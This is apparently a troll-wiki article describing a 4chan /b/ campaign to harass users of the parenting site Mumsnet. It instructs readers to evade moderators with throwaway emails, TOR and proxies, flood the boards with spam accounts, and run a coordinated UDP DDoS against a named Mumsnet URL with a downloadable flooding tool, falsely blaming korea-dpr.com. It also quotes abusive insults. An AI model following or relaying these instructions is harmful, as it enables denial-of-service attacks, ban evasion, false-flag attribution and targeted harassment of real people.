==Background==
Mumsnet is a parenting site, supposedly the "number one" parenting site on the interbuttz. It's mainly full of - as the name would suggest - mums, but there are a few fathers on there as well. Trolling the said website began around early May with a few anons getting lulz out of winding up the doting helicopter parents.
The site has plenty of things on it, but only the "Talk" boards offer any way to wind people up. There are a fair few talk boards on the site but the main one for trolling has been "Am I Being Unreasonable?" or "AIBU" as it's known in its abbreviated form. Images unfortunately cannot be posted and the site DOES require email registration. Use [http://anonym.to/http://10minutemail.com 10minutemail] for quick signups. Use TOR if possible (hidemyass or another php/cgi proxy will do but TOR is better) as the mods like to use the banhammer on IPs if things get out of hand.
==Trolling and Raids==
Everything was going reasonably well until a few of the mums got tired of the trolling and started abusing anons. Said anons replied with more lulzy sarcastic comments (no abuse), yet the mums replied with abuse. The mums reported all anons posts and anon ended up being instab& for abuse, despite not abusing anyone.
===Reformation and Re-trolling===
After the banhammer had been used by the mods to rid mumsnet of the plague of anon, the mums rejoiced in their victory over the internet. Anon regrouped in [[/b/]] and launched a counter-offensive with [[copypasta]] spam on the various talk boards (focusing mainly on the "Am I Being Unreasonable" board). The banhammer was again used against anon (including IP bans) but anon was prepared for this, proxies were changed and the pre-prepared new accounts were logged in and spamming resumed. By this time the mums had reached apocalyptic rage levels and started to try and abuse anon, which was a horrific fail. Examples of this hueg fail are as follows:

Is that a threat CP?<br />
Do fuck off dear - and I'll take my chances thanks.

Anonymous is boring<br />
Anonymous is brainless<br />
anonymous is probably a sad spotty nineteen year old who hasn't got a girlfriend and still wanks with a sock on his hand and then feels dirty and ashamed about it

It's just some knobs from a site called 4chan. They can get quite nasty and personal, but it is best to just ignore them.

An example of epic trolling can be found here:  [http://anonym.to/http://www.mumsnet.com/Talk/am_i_being_unreasonable/756690-To-be-annoyed-with-childminder-for-giving-DS-ready-made].  Snippet, you make Anon proud!

===/b/lackup===
After the mums said these things they were dished out a warning by anon. They were asked simply to apologise for the unnecessary abuse and things would return to normal (naturally this would never have really happened). The mums declined to apologise and instead piled on the oh so hurtful words. So anon went back to /b/ and called for /b/lackup. Lulz ensued from this and mumsnet was again reduced to a sea of copypasta and general crapflooding.


Then there was a failing DDoS attack wich took the site down for 20 mins -_-

===Method===
Trolling has been successful, so the leg/i/on is now moving to plan B.  Many lulz were had, and the whores at mumsnet released a public apology... too little too late.  They also don't appear to know why they're apologizing.<br>
Plan B = DDoS
* Use EFC (LOIC sucks dick)
* We are blaming this on korea-dpr.com, so include some reference to korea-dpr.com in your TCP/UDP message.  The default one we're going to use is "korea-dpr.com!!!"
* Refer to the IRC channel for timing details.  Don't be a newfag and do this on your own.
<br>
Newfag's tl;dr guide to EFC:
* Download from [http://anonym.to/http://vgchan.net/files/src/warriors_battle_cannon.zip]
* Extract and install
* Set URL to http://anonym.to/http://mumsnet.com/Talk/am_i_being_unreasonable
* Click the "lock target" button
* Set threads to over9000 (that's 9001 for you newfags)
* Set method to UDP
* Click "Begin Attack" button

You can use the following BASH script to register bullshit accounts on mumsnet.
